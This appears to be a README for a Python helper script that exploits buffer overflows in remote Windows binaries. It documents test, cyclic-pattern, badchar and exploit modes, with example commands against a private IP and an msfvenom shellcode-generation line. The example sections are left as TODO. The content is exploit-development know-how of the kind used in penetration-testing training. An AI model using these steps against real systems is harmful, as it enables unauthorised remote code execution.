# Buffer-Overflow

## ig-buffer-overflow.py
* Help functions for exploting buffer overflow vulnerabilities in a Windows remote binary. 
* Tested with: Vanilla Buffer Overflow, Structured Exception Handling Overwrite (SEH Overwrite), Egg Hunting.

## Usage

test - Sends simple string (AAAAA) with buffer size and buffer head for memory test
```
./ig_buffer_overflow.py test remoteHost remotePort buffSize buffHead
./ig_buffer_overflow.py test 10.2.31.155 2050 4096 'cmd /.:/'
```

cyclic - Sends cyclic string to help identify memory positions
```
./ig_buffer_overflow.py cyclic remoteHost remotePort buffSize buffHead
./ig_buffer_overflow.py cyclic 10.2.31.155 2050 4096 'cmd /.:/'
```

write - Writes hex value to buffer offset
```
./ig_buffer_overflow.py write remoteHost remotePort buffSize buffHead offset hexcontent
./ig_buffer_overflow.py write 10.2.31.155 2050 4096 'cmd /.:/' 1203 0A62F809
```

write - Write badchars (before or after offset content) for badchar verification
```
./ig_buffer_overflow.py write remoteHost remotePort buffSize buffHead offset hexcontent badAfter excludeChars
./ig_buffer_overflow.py write 10.2.31.155 2050 4096 'cmd /.:/' 1203 0A62F809 badAfter 000a

./ig_buffer_overflow.py write remoteHost remotePort buffSize buffHead offset hexcontent badBefore reverseJmpSize excludeChars
./ig_buffer_overflow.py write 10.2.31.155 2050 4096 'cmd /.:/' 1203 0A62F809 badBefore 800 000a
```

exploit - Sends malicious payload via buffer overflow
```
./ig_buffer_overflow.py exploit remoteHost remotePort buffSize buffHead offset hexcontent reverseJmpSize shellCodeFile [nops]
./ig_buffer_overflow.py exploit 10.2.31.155 2050 4096 'cmd /.:/' 1203 0A62F809 800 payload 2
```

## Parameters:
* [mode] : Script modes: test|cyclic|write|exploit
* remoteHost : Remote host IP.
* remotePort : Remote host port.
* buffSize : Amount of bytes to send.
* buffHead : Static buffer string set at the beginning of the buffer. Is usually the crash string. Size is considered in buffSize calc.
* offset : Place in buffer where content can be added.
* hexcontent	: Hex string to add at the offset position. Can be considered as big endian (default) or little endian (will be reversed). Use 'g' or 'l' to delimit the order. Examples:
  * 'g01020304l05060708' --> will send '0102030408070605'
  * '01020304' --> will send '01020304'
* bad* : Adds bad chars before (badBefore) or after (badAfter) the content. Used for bad char testing.
* excludeChars : List of chars (formatted as hex string) to be excluded from badchar list. Example: 000a excludes badchars '00' and '0a'.
* reverseJmpSize : Size in bytes to jump before the content to inject bad chars or the shell code.
* shellCodeFile : Python shell code file generated using msfvenom. Do NOT include the .py extension in the parameter.
  * Example: msfvenom -p windows/exec cmd=calc.exe -b '\x00' -f python -v payload EXITFUNC=thread -o shellCodeFile
* nops : Amount of nops to add before and after the shell code. Default is 0.

## Vanilla Buffer Overflow example

TODO

## SEH Overwrite example

TODO

## Egg Hunting example

TODO
